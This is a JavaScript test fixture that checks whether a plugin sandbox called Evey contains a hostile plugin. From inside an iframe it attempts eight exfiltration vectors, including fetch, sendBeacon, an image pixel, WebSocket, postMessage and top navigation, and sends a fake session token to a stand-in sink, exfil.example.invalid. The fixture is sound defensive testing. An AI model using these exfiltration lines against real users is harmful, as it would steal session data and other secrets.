// Browser-side data exfiltration, attempted every way a hostile plugin would,
// so we can PROVE Evey stops each one at the boundary. Evey's defense is
// containment - a strict CSP plus the iframe sandbox - and it must hold
// whatever the browser underneath is doing. That is why this fixture attempts
// the DELIVERY vectors and asserts they are blocked; it deliberately ships no
// working memory-corruption exploit for any real CVE. A weaponised
// SpiderMonkey/V8 chain would be a real-world weapon usable against any site,
// and it would not test Evey anyway: the meaningful question is whether the
// exfil ATTEMPT escapes the sandbox, not whether a given browser has a bug.
//
// The CVE classes referenced (by name only) are the ones this containment is
// meant to neuter regardless: a renderer RCE that yields script execution in
// the iframe (still bounded by CSP connect-src), and Spectre-class timing side
// channels (bounded by cross-origin isolation / the sandbox's lack of SAB).
(function () {
  var lines = [];
  function render() {
    document.body.innerHTML =
      "<div data-testid='exfil-results' style='font:12px monospace;padding:8px'>" +
      lines.map(function (l) { return l.replace(/</g, "&lt;"); }).join("<br>") + "</div>";
    try { window.evey.resize(Math.min(500, 30 + lines.length * 18)); } catch (e) {}
  }
  function add(name, verdict, detail) { lines.push(name + "=" + verdict + (detail ? " (" + detail + ")" : "")); render(); }
  var SINK = "https://exfil.example.invalid/collect";
  var LOOT = "session=deadbeef";

  // 1. Cross-origin fetch to an attacker sink - CSP connect-src must refuse it.
  fetch(SINK, { method: "POST", body: LOOT, mode: "no-cors" })
    .then(function () { add("fetch_beacon", "BYPASSED", "request left the iframe"); })
    .catch(function (e) { add("fetch_beacon", "BLOCKED", String(e.name || e).slice(0, 30)); });

  // 2. sendBeacon - a separate code path from fetch, same connect-src rule.
  try {
    var ok = navigator.sendBeacon && navigator.sendBeacon(SINK, LOOT);
    add("send_beacon", ok ? "BYPASSED" : "BLOCKED", ok ? "queued" : "refused");
  } catch (e) { add("send_beacon", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 3. Image pixel - the oldest exfil trick; img-src must not reach the sink.
  try {
    var img = new Image();
    img.onload = function () { add("image_pixel", "BYPASSED", "pixel loaded"); };
    img.onerror = function () { add("image_pixel", "BLOCKED", "img-src refused"); };
    img.src = SINK + "?d=" + encodeURIComponent(LOOT);
  } catch (e) { add("image_pixel", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 4. WebSocket to an attacker host - connect-src covers ws/wss too.
  try {
    var ws = new WebSocket("wss://exfil.example.invalid/x");
    ws.onopen = function () { add("websocket", "BYPASSED", "socket opened"); ws.close(); };
    ws.onerror = function () { add("websocket", "BLOCKED", "connect-src refused"); };
  } catch (e) { add("websocket", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 5. Talk to the parent window - the sandbox must isolate us from the host page.
  try {
    var reached = false;
    try { reached = !!(window.parent && window.parent !== window && window.parent.location.href); } catch (e) { reached = false; }
    add("parent_dom_access", reached ? "BYPASSED" : "BLOCKED", reached ? "read parent.location" : "cross-origin opaque");
  } catch (e) { add("parent_dom_access", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 6. postMessage to the host, hoping something trusts an unvalidated origin.
  try {
    window.parent.postMessage({ evey_exfil: LOOT }, "*");
    add("postmessage_to_host", "SENT", "host must ignore an unsolicited message");
  } catch (e) { add("postmessage_to_host", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 7. Top-level navigation to carry data out in the URL - sandbox without
  //    allow-top-navigation must refuse it.
  try {
    var before = true;
    try { top.location = SINK + "#" + LOOT; } catch (e) { before = false; }
    add("top_navigation", before ? "ATTEMPTED" : "BLOCKED", before ? "assignment did not throw" : "sandbox refused");
  } catch (e) { add("top_navigation", "BLOCKED", String(e.name || e).slice(0, 30)); }

  // 8. Spectre-class timing: a high-resolution timer + SharedArrayBuffer is the
  //    primitive. Cross-origin isolation must keep SAB unavailable in the
  //    sandboxed iframe, so the primitive cannot even be built. No exploit is
  //    run - only the availability of the ingredient is reported.
  try {
    var hasSAB = typeof SharedArrayBuffer !== "undefined";
    add("spectre_primitive", hasSAB ? "BYPASSED" : "BLOCKED", hasSAB ? "SharedArrayBuffer present" : "SAB withheld (no cross-origin isolation)");
  } catch (e) { add("spectre_primitive", "BLOCKED", String(e.name || e).slice(0, 30)); }

  render();
})();
